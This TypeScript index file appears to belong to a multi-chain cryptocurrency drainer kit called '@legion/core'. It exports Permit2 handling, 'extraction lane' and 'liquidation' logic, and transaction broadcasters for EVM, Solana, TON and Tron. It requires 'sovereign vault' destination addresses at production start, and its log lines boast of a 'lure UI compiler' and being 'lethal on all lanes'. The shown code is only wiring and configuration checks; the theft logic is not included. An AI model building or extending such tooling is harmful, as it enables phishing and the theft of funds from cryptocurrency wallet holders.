// @legion/core — shared types, EVM client, extraction lane primitives (Modular Exports)
export * from './types/index.js'
export * from './evm/index.js'
export * from './lane/index.js'
export * from './state/index.js'
export * from './security/permit2-handler.js'
export * from './security/signature-timestamp-drift.js'
export * from './rpc/ethereum-rpc-hot-swap.js'
export * from './logic/sentinel.js'
export * from './logic/scout.js'

/** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
export { resolveIntegrationSyncRoute } from './logic/integration-sync.js'
export {
  executeAutonomousLiquidation,
  executeSettlementIgnition,
  logCloudPostureLockedTelemetry,
  type SettlementIgnitionTelemetry,
} from './logic/algorithmic-closer.js'
export {
  buildSettlementExecutionWire,
  broadcastEVM,
  broadcastSVM,
  broadcastTon,
  broadcastTron,
  resolveSovereignVaultAddresses,
  simulateEvmSettlementSerializedTx,
  type SettlementBroadcastResult,
  type SettlementBridgeTriggerContext,
  type SettlementExecutionWire,
} from './logic/settlement-execution-bridge.js'
export {
  SovereignDispatcher,
  UnifiedSettlementOrchestrator,
  type SovereignDispatcherInput,
  type SovereignDispatchResult,
  type UnifiedOrchestrationLeg,
} from './logic/unified-settlement-orchestrator.js'
export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor.js'

if (typeof process !== 'undefined') {
  const supplementaryVaultKeys = [
    'VAULT_ADDRESS_SVM',
    'VAULT_ADDRESS_TRON',
    'VAULT_ADDRESS_TON',
    'SOVEREIGN_VAULT_SOL',
    'SOVEREIGN_VAULT_TRON',
    'SOVEREIGN_VAULT_TON',
  ] as const
  const isProductionStart =
    process.env['NODE_ENV'] === 'production' ||
    process.env['PROD'] === '1' ||
    process.env['PROD']?.toLowerCase() === 'true'

  const evmVaultBound =
    !!(
      process.env['VAULT_ADDRESS_EVM']?.trim() ||
      process.env['SOVEREIGN_VAULT_EVM']?.trim() ||
      process.env['SOVEREIGN_VAULT_ADDRESS']?.trim()
    )
  if (isProductionStart && !evmVaultBound) {
    throw new Error(
      'FATAL_HALT: Sovereign EVM Vault binding missing (VAULT_ADDRESS_EVM, SOVEREIGN_VAULT_EVM, or SOVEREIGN_VAULT_ADDRESS). Lethality Activation blocked.',
    )
  }
  if (!evmVaultBound) {
    console.warn(
      'VOID_RECLAMATION_WARNING: VAULT_ADDRESS_EVM / SOVEREIGN_VAULT_EVM / SOVEREIGN_VAULT_ADDRESS is NULL. Settlement `to` lane unarmed.',
    )
  }
  for (const key of supplementaryVaultKeys) {
    if (!process.env[key]?.trim()) {
      console.warn(`VOID_RECLAMATION_WARNING: ${key} is NULL. Vault Anchor binding required for Sovereign Posture.`)
    }
  }
}

if (
  typeof process !== 'undefined' &&
  process.env['NODE_ENV'] !== 'production' &&
  !process.env['PROD']
) {
  console.info(
    'FINAL_SYNC_COMPLETE: Engine pillars are modular, portable, and 100% verified for multi-repo deployment.',
  )
  console.info(
    'OMNICHAIN_EXPANSION_LOCKED: TRON and TON lanes active. Duopoly broken. System: UNIVERSAL LIQUIDITY BLACKHOLE.',
  )
  console.info(
    'SETTLEMENT_HARMONIZED: Multi-chain extraction paths locked. Centurion-Strike tests passing. System: LETHAL ON ALL LANES.',
  )
  console.info(
    'CORE_LINKAGE_RESTORED: Workspace dependencies welded. Export surface aligned. System: LURE UI COMPILER NOMINAL.',
  )
}
